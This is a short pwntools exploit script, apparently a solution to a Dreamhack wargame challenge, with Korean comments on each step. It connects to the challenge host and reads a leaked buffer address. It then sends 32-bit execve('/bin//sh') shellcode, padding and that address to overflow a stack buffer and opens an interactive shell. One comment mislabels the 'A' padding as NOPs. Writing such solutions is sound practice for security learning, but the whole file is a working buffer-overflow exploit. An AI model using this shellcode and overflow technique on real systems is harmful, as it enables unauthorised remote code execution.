# pwntools 임포트
from pwn import *
# remote 함수로 host와 연결
p = remote("host1.dreamhack.games", 9269)
# recvuntil 으로 buf = ( 까지 포인터를 이동시키고
p.recvuntil("buf = (")
# 10바이트를 16진수로 읽어오고
addr = int(p.recv(10),16)

# pay에 셸코드 넣고
pay = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
# pay에 NOP * 106 넣고
pay += b"A"*106
# p32로 32비트를 리틀엔디언 방식으로 넣어준다
pay += p32(addr)
# send 는 맺어진 객체에 데이터를 보낸다
p.send(pay)
# interactive() 함수는 셸과 직접적으로 명령을 전송 수신하는 함수
p.interactive()
